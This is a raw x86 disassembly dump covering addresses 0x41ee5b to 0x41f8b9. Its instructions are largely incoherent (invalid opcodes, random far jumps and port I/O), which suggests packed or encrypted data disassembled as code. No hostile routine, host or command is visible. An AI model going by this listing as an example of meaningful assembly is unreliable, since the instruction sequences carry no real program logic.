  41ee5b:	mov    al,ds:0x92be08c7
  41ee60:	aad    0x64
  41ee62:	enter  0x92cb,0x59
  41ee66:	pushf  
  41ee67:	fs popf 
  41ee69:	mov    edx,DWORD PTR [ebx-0x79]
  41ee6c:	add    eax,0xc
	...
  41eed5:	add    BYTE PTR ds:0x7b197956,al
  41eedb:	aas    
  41eedc:	gs pop esi
  41eede:	pop    edx
  41eedf:	repnz call 0x67c9:0xa2a205e7
  41eee7:	dec    esp
  41eee8:	add    DWORD PTR [eax],eax
  41eeea:	add    BYTE PTR [ecx],al
  41eeec:	add    BYTE PTR [eax],al
  41eeee:	shl    DWORD PTR [esi+0x3c],1
  41eef1:	add    eax,0x1bacff1c
  41eef6:	dec    edx
  41eef7:	jae    0x41ee7d
  41eef9:	cmp    DWORD PTR [ecx],edi
  41eefb:	psubq  mm5,QWORD PTR [esi-0x15dc55d8]
  41ef02:	mov    edi,DWORD PTR [edx]
  41ef04:	pop    es
  41ef05:	mov    cl,0x33
  41ef07:	pop    esi
  41ef08:	push   ds
  41ef09:	push   edx
  41ef0a:	mov    BYTE PTR [esi-0x134c3732],ch
  41ef10:	das    
  41ef11:	mov    ah,BYTE PTR ds:0xff666b8e
  41ef17:	outs   dx,BYTE PTR ds:[esi]
  41ef18:	les    edi,FWORD PTR [edi+ebx*2+0x186320f5]
  41ef1f:	dec    ebx
  41ef20:	fs mov edi,0x7fd57628
  41ef26:	(bad)  
  41ef27:	push   ds
  41ef28:	mov    al,ds:0x37c40dd5
  41ef2d:	and    ah,BYTE PTR [ebp+ebp*4-0x13]
  41ef31:	xchg   DWORD PTR [ecx+0x45],ebx
  41ef34:	pop    ebx
  41ef35:	push   cs
  41ef36:	inc    eax
  41ef37:	pop    edi
  41ef38:	loope  0x41eefc
  41ef3a:	loope  0x41ef0a
  41ef3c:	pop    eax
  41ef3d:	mov    bl,0x34
  41ef3f:	inc    edx
  41ef40:	and    al,BYTE PTR [edx]
  41ef42:	add    BYTE PTR [edi-0x3b],bl
  41ef45:	out    dx,eax
  41ef46:	xor    DWORD PTR [ebx+0x44],0x38
  41ef4a:	(bad)  
  41ef4b:	hlt    
  41ef4c:	int3   
  41ef4d:	outs   dx,DWORD PTR ds:[esi]
  41ef4e:	repnz cmp al,0x23
  41ef51:	inc    eax
  41ef52:	pop    ss
  41ef53:	jo     0x41ef1c
  41ef55:	jmp    0xec262c10
  41ef5a:	clc    
  41ef5b:	cmp    eax,0xb3e033d0
  41ef60:	mov    ecx,0xfc38a06d
  41ef65:	gs pop ds
  41ef67:	clc    
  41ef68:	jne    0x41efa0
  41ef6a:	cmp    al,0x93
  41ef6c:	sub    esi,ecx
  41ef6e:	and    eax,0xdeebce91
  41ef73:	mov    edx,0xd23caaed
  41ef78:	repnz scas al,BYTE PTR es:[edi]
  41ef7a:	and    dh,BYTE PTR [edi+0x38]
  41ef7d:	jg     0x41ef8f
  41ef7f:	fmul   DWORD PTR [eax+0x6f]
  41ef82:	jae    0x41ef94
  41ef84:	mov    al,0x42
  41ef86:	or     ecx,DWORD PTR [ecx]
  41ef88:	xchg   edx,eax
  41ef89:	adc    edx,esi
  41ef8b:	imul   ebp,eax,0xaf25a8d9
  41ef91:	ret    
  41ef92:	(bad)  
  41ef93:	int    0xde
  41ef95:	inc    ebp
  41ef96:	rcl    DWORD PTR [eax+0x49865a4a],0x7c
  41ef9d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ef9e:	sub    esi,ebx
  41efa0:	mov    ds:0x9e778287,eax
  41efa5:	and    BYTE PTR [ecx+0x70],bh
  41efa8:	inc    eax
  41efa9:	xlat   BYTE PTR ds:[ebx]
  41efaa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41efab:	test   al,0x3b
  41efad:	(bad)  
  41efae:	iret   
  41efaf:	and    eax,0x79481ae9
  41efb4:	mov    bl,0xc9
  41efb6:	inc    edx
  41efb7:	and    cl,BYTE PTR [ebx+0x1d96f0ed]
  41efbd:	adc    al,0xa7
  41efbf:	push   edi
  41efc0:	fsub   QWORD PTR [ecx-0x3f69e320]
  41efc6:	div    DWORD PTR [edx+0x2f30d058]
  41efcc:	dec    esp
  41efcd:	retf   0x8a87
  41efd0:	push   0xffffff82
  41efd2:	add    al,ah
  41efd4:	popf   
  41efd5:	lea    eax,[eax+eax*4]
  41efd8:	test   BYTE PTR [esi+0x6c2c14dd],al
  41efde:	dec    ecx
  41efdf:	fst    st(3)
  41efe1:	mov    al,ds:0x7f945900
  41efe6:	pop    es
  41efe7:	push   cs
  41efe8:	out    dx,al
  41efe9:	test   BYTE PTR [edx+0x6e],0x1a
  41efed:	ins    BYTE PTR es:[edi],dx
	...
  41f056:	mov    ecx,0xff25bf5d
  41f05b:	out    0xbb,eax
  41f05d:	fisttp QWORD PTR [ecx+0x0]
  41f060:	lock imul edx,DWORD PTR [edx],0xfffffff5
  41f064:	pop    ebp
  41f065:	add    eax,0x14d67
  41f06a:	add    BYTE PTR [ecx],al
  41f06c:	add    BYTE PTR [eax],al
  41f06e:	dec    esp
  41f06f:	aas    
  41f070:	add    DWORD PTR [esi+0x78],0x5e
  41f074:	pop    es
  41f075:	push   ds
  41f076:	aad    0xc3
  41f078:	fnsave [edx+edx*8+0x16]
  41f07c:	dec    edx
  41f07d:	adc    esi,DWORD PTR ds:0x34518b94
  41f083:	rol    BYTE PTR [ebp-0x68108b60],1
  41f089:	stos   BYTE PTR es:[edi],al
  41f08a:	cmc    
  41f08b:	mov    dh,0x9f
  41f08d:	push   eax
  41f08e:	stc    
  41f08f:	sbb    eax,0x199bed8a
  41f094:	imul   edi,DWORD PTR [eax+0x14892665],0xd
  41f09b:	mov    eax,ds:0x249feaa5
  41f0a0:	popf   
  41f0a1:	xor    cl,BYTE PTR [ecx]
  41f0a3:	or     eax,0x3b2258
  41f0a8:	inc    edi
  41f0a9:	loop   0x41f0b8
  41f0ab:	das    
  41f0ac:	inc    edi
  41f0ad:	cli    
  41f0ae:	(bad)  
  41f0af:	in     al,dx
  41f0b0:	les    ebp,FWORD PTR [eax-0x51e72591]
  41f0b6:	xor    edx,edx
  41f0b8:	enter  0xb439,0xf1
  41f0bc:	sub    eax,0x740c366d
  41f0c1:	add    esp,DWORD PTR [ebx-0x4bd4edd1]
  41f0c7:	arpl   WORD PTR [edx-0x13],cx
  41f0ca:	(bad)  
  41f0cb:	mov    ds:0x84f62dd5,eax
  41f0d0:	fist   WORD PTR [eax+0x7e9080d2]
  41f0d6:	push   edi
  41f0d7:	or     al,0x60
  41f0d9:	mov    WORD PTR [eax+0x2d],?
  41f0dc:	jecxz  0x41f153
  41f0de:	mov    ds:0x71ec9788,eax
  41f0e3:	shl    DWORD PTR [edx-0x5f0f68e8],cl
  41f0e9:	xchg   esi,eax
  41f0ea:	xor    eax,0x270d1609
  41f0ef:	xchg   ebx,eax
  41f0f0:	push   ds
  41f0f1:	xchg   ecx,eax
  41f0f2:	cmp    eax,0x6f9befe7
  41f0f7:	and    BYTE PTR [edi-0xfaca828],dl
  41f0fd:	mov    ds:0x77caf1ca,eax
  41f102:	enter  0x1052,0x44
  41f106:	lahf   
  41f107:	test   eax,0x12ff0e88
  41f10c:	dec    ebx
  41f10d:	and    al,0x15
  41f10f:	push   0xd93311ab
  41f114:	add    BYTE PTR [ecx+edi*2-0x57],dh
  41f118:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f119:	out    0x57,al
  41f11b:	mov    WORD PTR [ebx],?
  41f11d:	test   al,0xd
  41f11f:	daa    
  41f120:	and    bl,BYTE PTR [eax+0x1b6d882b]
  41f126:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f127:	aas    
  41f128:	jne    0x41f129
  41f12a:	add    bl,ch
  41f12c:	fld    TBYTE PTR [edi+eiz*2+0x20c035b3]
  41f133:	adc    eax,0x5deff506
  41f138:	cmp    DWORD PTR [esi+0xa],0x66
  41f13c:	adc    bh,dl
  41f13e:	mov    ds:0x11071572,al
  41f143:	push   cs
  41f144:	jg     0x41f122
  41f146:	data16 add bh,dh
  41f149:	sub    al,0x21
  41f14b:	lahf   
  41f14c:	push   cs
  41f14d:	dec    eax
  41f14e:	test   al,0x5c
  41f150:	leave  
  41f151:	jl     0x41f18f
  41f153:	mov    ds:0xeb08aef6,eax
  41f158:	test   eax,0xc4f5e2ed
  41f15d:	ret    0xa561
  41f160:	pop    ebx
  41f161:	mov    ch,0xf8
  41f163:	out    0x7,al
  41f165:	xchg   edx,eax
  41f166:	fdivr  QWORD PTR [eax-0x9]
  41f169:	xlat   BYTE PTR ds:[ebx]
  41f16a:	dec    esp
  41f16b:	mov    ds:0x24f7,al
	...
  41f1d4:	add    BYTE PTR [eax],al
  41f1d6:	fild   QWORD PTR [edx+ebp*1+0x6c]
  41f1db:	mov    ebx,0x3824ffdf
  41f1e0:	(bad)  
  41f1e1:	jmp    0x4e67:0x9c8da80d
  41f1e8:	add    DWORD PTR [eax],eax
  41f1ea:	add    BYTE PTR [ecx],al
  41f1ec:	add    BYTE PTR [eax],al
  41f1ee:	lods   eax,DWORD PTR ds:[esi]
  41f1ef:	fisttp QWORD PTR [ebp+0x29]
  41f1f2:	icebp  
  41f1f3:	inc    ebx
  41f1f4:	shrd   ebp,edx,0xf3
  41f1f8:	rol    BYTE PTR [esi+eiz*2+0x46],cl
  41f1fc:	mov    al,0x3f
  41f1fe:	fs jmp 0xdc5:0x304a65d2
  41f206:	sub    eax,0x2dbaad8b
  41f20b:	xchg   ecx,eax
  41f20c:	inc    edx
  41f20d:	aam    0xbb
  41f20f:	sti    
  41f210:	mov    al,ds:0x7f42426e
  41f215:	in     al,dx
  41f216:	int    0x3b
  41f218:	mov    esi,ecx
  41f21a:	stos   BYTE PTR es:[edi],al
  41f21b:	sub    dh,bh
  41f21d:	jg     0x41f1a6
  41f21f:	dec    ebx
  41f220:	mov    ch,bl
  41f222:	cmp    eax,0x6c9dc09c
  41f227:	sub    BYTE PTR [eax+0x15],cl
  41f22a:	pop    eax
  41f22b:	in     eax,0x5b
  41f22d:	pop    ebx
  41f22e:	emms   
  41f230:	push   cs
  41f231:	fs adc al,0x18
  41f234:	fwait
  41f235:	pop    edi
  41f236:	sub    eax,0xa7a12485
  41f23b:	or     eax,0xc8e248de
  41f240:	mov    ebx,0xe9c11836
  41f245:	pop    es
  41f246:	aam    0x71
  41f248:	jle    0x41f2ab
  41f24a:	push   edi
  41f24b:	nop
  41f24c:	fadd   QWORD PTR [ebx]
  41f24e:	mov    ah,0x93
  41f250:	add    BYTE PTR [ecx-0x7a404f58],bl
  41f256:	pusha  
  41f257:	cli    
  41f258:	inc    esi
  41f259:	aam    0x18
  41f25b:	pop    es
  41f25c:	loop   0x41f26e
  41f25e:	mov    esp,0xd9b53647
  41f263:	and    eax,0xeabb3aa3
  41f268:	xor    eax,0xd7d4ad62
  41f26d:	pop    es
  41f26e:	call   0x9f78ff9
  41f273:	rol    bl,0xf1
  41f276:	mov    bl,BYTE PTR [edx-0x1ac9ff31]
  41f27c:	pop    eax
  41f27d:	xor    BYTE PTR [esi+0x163c8581],dl
  41f283:	sbb    eax,0x69d8cd1a
  41f288:	fidivr DWORD PTR [esi]
  41f28a:	and    al,ah
  41f28c:	out    0x68,eax
  41f28e:	aaa    
  41f28f:	mov    eax,0x59d497a3
  41f294:	lods   eax,DWORD PTR ds:[esi]
  41f295:	cmp    al,0xe6
  41f298:	xor    al,0x16
  41f29a:	cs jno 0x41f25f
  41f29d:	gs jo  0x41f27c
  41f2a0:	pop    ebp
  41f2a1:	enter  0x6186,0xd2
  41f2a5:	sub    ebp,DWORD PTR [edi]
  41f2a7:	mul    edi
  41f2a9:	dec    ecx
  41f2aa:	aas    
  41f2ab:	push   ss
  41f2ac:	xor    al,0x8e
  41f2ae:	div    BYTE PTR [ebx+edi*8+0x544fab81]
  41f2b5:	sbb    DWORD PTR [edx-0x48],edi
  41f2b8:	pop    ebx
  41f2b9:	sbb    edi,ebx
  41f2bb:	fwait
  41f2bc:	stos   DWORD PTR es:[edi],eax
  41f2bd:	in     eax,dx
  41f2be:	pop    esi
  41f2bf:	out    dx,al
  41f2c0:	mov    esi,0x674f4c53
  41f2c5:	xchg   edx,eax
  41f2c6:	pop    edi
  41f2c7:	xchg   ebp,eax
  41f2c8:	test   BYTE PTR [ebx+0x498ce59d],cl
  41f2ce:	sti    
  41f2cf:	das    
  41f2d0:	inc    edi
  41f2d1:	sub    al,0x41
  41f2d3:	jg     0x41f32c
  41f2d5:	xlat   BYTE PTR ds:[ebx]
  41f2d6:	ins    BYTE PTR es:[edi],dx
  41f2d7:	out    0xe8,al
  41f2d9:	xor    esi,DWORD PTR [ebx+esi*4+0x401ddef1]
  41f2e0:	jge    0x41f2b1
  41f2e2:	mov    bh,ah
  41f2e4:	xor    al,0x48
  41f2e6:	into   
  41f2e7:	xchg   esi,eax
  41f2e8:	ror    BYTE PTR [esi-0x37853df8],1
	...
  41f356:	push   ecx
  41f357:	sbb    edi,edi
  41f359:	jmp    si
  41f35c:	fnstcw WORD PTR [edi]
  41f35e:	jo     0x41f34d
  41f360:	sahf   
  41f361:	jb     0x41f2eb
  41f363:	add    DWORD PTR [edi-0xe],eax
  41f366:	addr16 dec edi
  41f368:	add    DWORD PTR [eax],eax
  41f36a:	add    BYTE PTR [ecx],al
  41f36c:	add    BYTE PTR [eax],al
  41f36e:	mov    bh,0x4
  41f370:	xchg   BYTE PTR [ebx-0x4f195022],dl
  41f376:	adc    esi,edx
  41f378:	repnz (bad) 
  41f37a:	(bad)  
  41f37b:	xchg   ebp,eax
  41f37c:	sbb    DWORD PTR [edx+0x1d],0x35
  41f380:	test   eax,0xd51f97ed
  41f385:	outs   dx,DWORD PTR ds:[esi]
  41f386:	sbb    eax,0xa7993f7b
  41f38b:	push   0xd4113d76
  41f390:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  41f392:	lods   al,BYTE PTR ds:[esi]
  41f393:	jp     0x41f3f2
  41f395:	fist   DWORD PTR fs:[esi]
  41f398:	and    BYTE PTR [ebx+ebx*1-0x8],ah
  41f39c:	xchg   edx,eax
  41f39d:	pusha  
  41f39e:	add    ecx,eax
  41f3a0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f3a1:	arpl   di,di
  41f3a3:	es cld 
  41f3a5:	inc    esp
  41f3a6:	inc    ecx
  41f3a7:	dec    BYTE PTR [ebx]
  41f3a9:	mov    cl,0x34
  41f3ab:	stos   DWORD PTR es:[edi],eax
  41f3ac:	xchg   dh,al
  41f3ae:	shr    DWORD PTR [ebx-0x32],1
  41f3b1:	add    eax,0x4d428715
  41f3b6:	adc    cl,dh
  41f3b8:	cmp    BYTE PTR [ebx],al
  41f3ba:	stos   DWORD PTR es:[edi],eax
  41f3bb:	xchg   esp,eax
  41f3bc:	sbb    ebp,edx
  41f3be:	inc    ebx
  41f3bf:	ret    0x795f
  41f3c2:	add    ebx,ecx
  41f3c4:	push   ebp
  41f3c5:	xor    BYTE PTR [esi-0x63],0x18
  41f3c9:	dec    edi
  41f3ca:	dec    edi
  41f3cb:	fimul  WORD PTR [eax-0x8]
  41f3ce:	rcr    ebp,0xea
  41f3d1:	sbb    DWORD PTR [ebp-0x83afa5a],ebx
  41f3d7:	fs lahf 
  41f3d9:	add    DWORD PTR [edx+0x4155c2f5],0xf4f82580
  41f3e3:	xor    esp,DWORD PTR [edx]
  41f3e5:	add    eax,0x16f26c3c
  41f3ea:	in     al,dx
  41f3eb:	sahf   
  41f3ec:	inc    edx
  41f3ed:	jb     0x41f409
  41f3ef:	and    ebx,edx
  41f3f1:	shl    BYTE PTR [ebp+0x23bce53c],cl
  41f3f7:	pop    ss
  41f3f8:	scas   al,BYTE PTR es:[edi]
  41f3f9:	pop    ds
  41f3fa:	jle    0x41f405
  41f3fc:	push   edi
  41f3fd:	add    DWORD PTR [ebp-0x672dd9a7],ebp
  41f403:	leave  
  41f404:	jp     0x41f432
  41f406:	mov    WORD PTR [edx+0x39],es
  41f409:	or     DWORD PTR [ebx+0x2b],0x52e0d32d
  41f410:	gs cmp al,0x7c
  41f413:	lea    ebx,[eax+0x31f0ff9c]
  41f419:	shl    BYTE PTR [ecx],1
  41f41b:	and    ch,al
  41f41d:	in     eax,0x48
  41f41f:	push   esi
  41f420:	xor    edi,ecx
  41f422:	js     0x41f3aa
  41f424:	add    dh,BYTE PTR [esi+ebp*2+0x40]
  41f428:	cmp    eax,0x3613401a
  41f42d:	sub    eax,0x5aa37946
  41f432:	stc    
  41f433:	pushf  
  41f434:	jae    0x41f3ee
  41f436:	rol    BYTE PTR [ecx-0x6837e4d5],cl
  41f43c:	xor    al,0xfa
  41f43e:	outs   dx,BYTE PTR ds:[esi]
  41f43f:	out    0xb1,al
  41f441:	std    
  41f442:	and    DWORD PTR [ecx],ebp
  41f444:	mov    ds:0xa437a26f,eax
  41f449:	int    0x12
  41f44b:	out    0x81,al
  41f44d:	add    ecx,ebx
  41f44f:	xchg   BYTE PTR [ebx-0xdd6fa83],bh
  41f455:	enter  0x1fc,0x7a
  41f459:	ror    eax,0x82
  41f45c:	mov    al,ds:0xa41599d8
  41f461:	jne    0x41f41f
  41f463:	shl    DWORD PTR ds:0x60b8045a,cl
  41f469:	shl    BYTE PTR [eax+0xb73b18],0x0
	...
  41f4d4:	add    BYTE PTR [eax],al
  41f4d6:	cmp    al,0xe7
  41f4d8:	imul   ebp,edi,0xfffffffb
  41f4db:	out    dx,eax
  41f4dc:	mov    esp,0xd5fd13f7
  41f4e1:	mov    ch,0x79
  41f4e3:	xchg   esi,eax
  41f4e4:	cmp    DWORD PTR [ecx],0x15067
  41f4ea:	add    BYTE PTR [ecx],al
  41f4ec:	add    BYTE PTR [eax],al
  41f4ee:	inc    edx
  41f4ef:	retf   
  41f4f0:	mov    bh,0x86
  41f4f2:	add    dl,BYTE PTR [eax-0x38]
  41f4f5:	cmp    DWORD PTR [ebx+ebp*8+0x4b],edx
  41f4f9:	test   eax,0x64614c0b
  41f4fe:	call   0x7965:0xfa4feed5
  41f505:	mov    ecx,0x5ae3299c
  41f50a:	adc    ax,0xf614
  41f50e:	sahf   
  41f50f:	mov    edx,0x3e1031a1
  41f514:	in     al,0xe
  41f516:	mov    eax,DWORD PTR [ebp+0x37007447]
  41f51c:	pop    edx
  41f51d:	aaa    
  41f51e:	adc    edx,DWORD PTR [eax]
  41f520:	adc    esp,DWORD PTR [esp+edx*2+0x6a1b74c4]
  41f527:	inc    edi
  41f528:	cli    
  41f529:	aaa    
  41f52a:	cmp    ch,ah
  41f52c:	adc    ebx,0xd18e414b
  41f532:	mov    cl,0xbd
  41f534:	lods   eax,DWORD PTR ds:[esi]
  41f535:	outs   dx,BYTE PTR ds:[esi]
  41f536:	sub    ebx,DWORD PTR [eax+0x2e]
  41f539:	enter  0x7d9,0xa1
  41f53d:	dec    edx
  41f53e:	push   edx
  41f53f:	pop    ebx
  41f540:	push   ecx
  41f541:	sub    eax,0x907e0a68
  41f546:	fucomp st(0)
  41f548:	test   BYTE PTR [ecx+ebx*8+0x2e6249fb],dl
  41f54f:	xor    al,0x6a
  41f551:	add    al,BYTE PTR [ecx]
  41f553:	pop    ebx
  41f554:	imul   edi,DWORD PTR [ecx],0x40
  41f557:	(bad)  
  41f558:	(bad)  
  41f559:	jo     0x41f4fe
  41f55b:	cld    
  41f55c:	dec    edi
  41f55d:	test   BYTE PTR [esi+0x3a],dh
  41f560:	(bad)  [edx]
  41f562:	dec    edi
  41f563:	dec    BYTE PTR [edi]
  41f565:	sub    al,0x7b
  41f567:	inc    edi
  41f568:	adc    eax,DWORD PTR [ebp+0x1b3475de]
  41f56e:	pusha  
  41f56f:	ror    BYTE PTR [edx],1
  41f571:	push   esp
  41f572:	adc    eax,0xab139dc1
  41f577:	outs   dx,BYTE PTR ds:[esi]
  41f578:	sbb    bl,BYTE PTR [esi-0x3660be1d]
  41f57e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f57f:	cmp    al,0xf3
  41f581:	scas   al,BYTE PTR es:[edi]
  41f582:	mov    cl,0x76
  41f584:	and    eax,0xbc0cc865
  41f589:	push   ds
  41f58a:	cmp    DWORD PTR [eax-0x73b8b542],ebx
  41f590:	sub    cl,bh
  41f592:	cmp    al,0x72
  41f594:	pop    ss
  41f595:	xor    cl,0xf4
  41f598:	or     ebx,DWORD PTR [ecx]
  41f59a:	cwde   
  41f59b:	pop    esi
  41f59c:	ja     0x41f5c8
  41f59e:	pop    edi
  41f59f:	shl    DWORD PTR [ebx+0x6a564fa7],cl
  41f5a5:	pop    eax
  41f5a6:	fld    QWORD PTR [eax+esi*1+0x145985e9]
  41f5ad:	clc    
  41f5ae:	jbe    0x41f605
  41f5b0:	ja     0x41f62f
  41f5b2:	push   es
  41f5b3:	jecxz  0x41f5fc
  41f5b5:	push   eax
  41f5b6:	fst    DWORD PTR [esi]
  41f5b8:	(bad)  
  41f5b9:	or     bl,BYTE PTR [eax-0x266fd2f4]
  41f5bf:	sbb    esi,DWORD PTR [edx]
  41f5c1:	mov    al,0x4b
  41f5c3:	pop    edx
  41f5c4:	mov    edi,0x7085df53
  41f5c9:	dec    esi
  41f5ca:	aad    0x3a
  41f5cc:	adc    DWORD PTR [esi],0x5c
  41f5cf:	cmp    ch,BYTE PTR [edi+edi*4]
  41f5d2:	inc    esi
  41f5d3:	shl    cl,cl
  41f5d5:	push   edx
  41f5d6:	adc    BYTE PTR [esi+0x20],al
  41f5d9:	sub    eax,0x5fdc0a7d
  41f5de:	or     esp,esi
  41f5e0:	dec    esp
  41f5e1:	xor    eax,DWORD PTR [eax+0x2bbfce14]
  41f5e7:	(bad)  
  41f5e8:	repz jmp 0x8f92f527
	...
  41f656:	js     0x41f68c
  41f658:	add    bh,bl
  41f65a:	dec    esi
  41f65b:	(bad)  
  41f65c:	stc    
  41f65d:	mov    bh,0xb7
  41f65f:	jmp    0x43d4:0x3a7fd422
  41f666:	addr16 push ecx
  41f668:	add    DWORD PTR [eax],eax
  41f66a:	add    BYTE PTR [ecx],al
  41f66c:	add    BYTE PTR [eax],al
  41f66e:	fadd   DWORD PTR [ebp+0x27]
  41f671:	xor    ebx,eax
  41f673:	pop    esi
  41f674:	xor    bl,BYTE PTR [ebx+0x32410334]
  41f67a:	xor    ah,BYTE PTR [eax]
  41f67c:	and    ah,bl
  41f67e:	int    0xb5
  41f680:	adc    eax,0xa0e79da4
  41f685:	push   0x15206006
  41f68a:	jp     0x41f6f4
  41f68c:	ret    
  41f68d:	dec    esp
  41f68e:	out    0x68,eax
  41f690:	jmp    0x41f657
  41f692:	cmp    BYTE PTR [edx+edx*8+0x13],al
  41f696:	nop
  41f697:	icebp  
  41f698:	pop    edx
  41f699:	adc    DWORD PTR [edx*8+0x7e93868],edi
  41f6a0:	adc    eax,0x9d6aada6
  41f6a5:	cs push esp
  41f6a7:	inc    ebx
  41f6a8:	adc    al,0x8c
  41f6aa:	mov    dl,0xcd
  41f6ac:	xchg   esi,eax
  41f6ad:	sub    BYTE PTR [ecx],ch
  41f6af:	mov    esi,0xd3c202a0
  41f6b4:	pop    ds
  41f6b5:	dec    esp
  41f6b6:	jle    0x41f64c
  41f6b8:	aad    0xbb
  41f6ba:	inc    ecx
  41f6bb:	paddsw mm7,mm7
  41f6be:	or     eax,0x5a9d6b9c
  41f6c3:	and    al,0x98
  41f6c5:	jle    0x41f682
  41f6c7:	mov    eax,DWORD PTR [ecx-0x5e194d4c]
  41f6cd:	jae    0x41f706
  41f6cf:	sahf   
  41f6d0:	sub    edi,ebp
  41f6d2:	gs fdivrp st(6),st
  41f6d5:	push   cs
  41f6d6:	mov    esp,0x7e3586cd
  41f6db:	and    DWORD PTR [esi-0x54315d8a],eax
  41f6e1:	repz test al,0xc5
  41f6e4:	lds    ebp,FWORD PTR [esp+ecx*8]
  41f6e7:	adc    ch,BYTE PTR [eax+eax*1+0xa]
  41f6eb:	(bad)  
  41f6ed:	push   es
  41f6ee:	lock out 0x31,eax
  41f6f1:	fcomi  st,st(0)
  41f6f3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f6f4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f6f5:	pop    edx
  41f6f6:	pusha  
  41f6f7:	mov    esp,0x2e01d7dc
  41f6fc:	mov    BYTE PTR [eax+0x17ababc1],al
  41f702:	push   0xffffffcc
  41f704:	mov    cl,0x7c
  41f706:	mov    ecx,DWORD PTR [edi+0x70480c86]
  41f70c:	outs   dx,DWORD PTR ds:[esi]
  41f70d:	aad    0x71
  41f70f:	cmp    cl,cl
  41f711:	cmp    DWORD PTR [ebp+0x5e0f7849],eax
  41f717:	ror    edx,cl
  41f719:	(bad)  
  41f71b:	mov    DWORD PTR [eax-0x67],edi
  41f71e:	adc    eax,0xbcb90f07
  41f723:	add    DWORD PTR [ecx-0x71],esp
  41f726:	dec    edx
  41f727:	pushf  
  41f728:	dec    edi
  41f729:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f72a:	jl     0x41f6c5
  41f72c:	scas   al,BYTE PTR es:[edi]
  41f72d:	pop    ebx
  41f72e:	rcr    al,0xfc
  41f731:	dec    esi
  41f732:	shr    DWORD PTR [eax+ebp*1-0x25],cl
  41f736:	xor    ebp,DWORD PTR [ecx]
  41f738:	dec    ebp
  41f739:	push   ds
  41f73a:	in     eax,dx
  41f73b:	push   edx
  41f73c:	adc    al,0x36
  41f73e:	leave  
  41f73f:	sahf   
  41f740:	sub    BYTE PTR cs:[edx],bh
  41f743:	push   ds
  41f744:	jmp    0xd2ca39ab
  41f749:	call   0x762b:0x2b02229
  41f750:	mov    ebp,0xe4d5ed13
  41f755:	xor    eax,0x48f99881
  41f75a:	or     eax,0xc994b7d
  41f75f:	cmp    edx,esi
  41f761:	in     eax,0x82
  41f763:	jmp    0x41f796
  41f765:	mov    ch,0x58
  41f767:	cs aas 
  41f769:	out    0x99,eax
  41f76b:	push   esp
  41f76c:	(bad)  
  41f76d:	jl     0x41f76f
	...
  41f7d3:	add    BYTE PTR [eax],al
  41f7d5:	add    BYTE PTR [edx-0x5081dcc4],dl
  41f7db:	jg     0x41f7bc
  41f7dd:	cld    
  41f7de:	call   0xc019:0x1a6c62d2
  41f7e5:	aas    
  41f7e6:	addr16 push edx
  41f7e8:	add    DWORD PTR [eax],eax
  41f7ea:	add    BYTE PTR [ecx],al
  41f7ec:	add    BYTE PTR [eax],al
  41f7ee:	xor    DWORD PTR [ebp-0x329d80b9],0xffffffae
  41f7f5:	gs repz hlt 
  41f7f8:	adc    DWORD PTR [edx-0x1019433b],edi
  41f7fe:	sub    edx,DWORD PTR [esi+edi*2]
  41f801:	mov    dl,0xfd
  41f803:	push   ebx
  41f804:	dec    ebp
  41f805:	fld    st(1)
  41f807:	and    al,0x1e
  41f809:	cli    
  41f80a:	bound  ecx,QWORD PTR [ebp-0x64]
  41f80d:	jg     0x41f868
  41f80f:	int    0xd1
  41f811:	jmp    0x41f7a2
  41f813:	mov    esp,ebp
  41f815:	sti    
  41f816:	adc    DWORD PTR [ebx+ebx*1-0x29ea4e23],edi
  41f81d:	and    al,0x22
  41f81f:	arpl   WORD PTR [ecx],di
  41f821:	retf   
  41f822:	test   eax,0x5cfca2f5
  41f827:	xor    BYTE PTR [edx],bl
  41f829:	xchg   ecx,eax
  41f82a:	xlat   BYTE PTR ds:[ebx]
  41f82b:	jmp    0xd89d:0x663138a7
  41f832:	cmp    al,0xf0
  41f834:	pushf  
  41f835:	in     al,0x31
  41f837:	mov    esi,0xc1a0dcca
  41f83c:	sub    BYTE PTR ds:0x5763308b,0xe9
  41f843:	dec    eax
  41f844:	shr    DWORD PTR [esi+0x5fd6cd14],0x9f
  41f84b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f84c:	mov    BYTE PTR [eax+0x7f],bh
  41f84f:	push   cs
  41f850:	push   edx
  41f851:	sbb    ah,BYTE PTR [edi+0x29a5233d]
  41f857:	mov    dh,0x6
  41f859:	jle    0x41f8ca
  41f85b:	std    
  41f85c:	scas   eax,DWORD PTR es:[edi]
  41f85d:	xchg   ecx,eax
  41f85e:	je     0x41f844
  41f860:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f861:	cwde   
  41f862:	enter  0x3558,0x66
  41f866:	fidivr DWORD PTR [edi]
  41f868:	cmc    
  41f869:	cmc    
  41f86a:	out    0xb7,eax
  41f86c:	xchg   edx,eax
  41f86d:	or     cl,0x63
  41f870:	fwait
  41f871:	loop   0x41f88f
  41f873:	dec    edx
  41f874:	mov    al,ds:0x3033cf31
  41f879:	inc    esp
  41f87a:	pop    esi
  41f87b:	mov    esp,0x538c4bd
  41f880:	push   esi
  41f881:	jo     0x41f8f0
  41f883:	dec    ecx
  41f884:	popf   
  41f885:	pop    ss
  41f886:	xor    al,0x3f
  41f888:	sti    
  41f889:	inc    ecx
  41f88a:	clc    
  41f88b:	push   eax
  41f88c:	(bad)  
  41f88d:	lods   eax,DWORD PTR ds:[esi]
  41f88e:	cmp    BYTE PTR [esp+edx*4+0x6c],cl
  41f892:	into   
  41f893:	push   0xc44ac2a8
  41f898:	or     esi,DWORD PTR ds:0xeab5d6f8
  41f89e:	bound  eax,QWORD PTR [esi+0x74]
  41f8a1:	jp     0x41f893
  41f8a3:	xchg   ebx,eax
  41f8a4:	in     eax,dx
  41f8a5:	mov    ds:0x7af5fc39,al
  41f8aa:	outs   dx,BYTE PTR ds:[esi]
  41f8ab:	loopne 0x41f85c
  41f8ad:	mov    ecx,0xdb2923bd
  41f8b2:	or     ebx,0xa234437b
  41f8b8:	aas    
  41f8b9:	cmp    dh,BYTE PTR [esi]
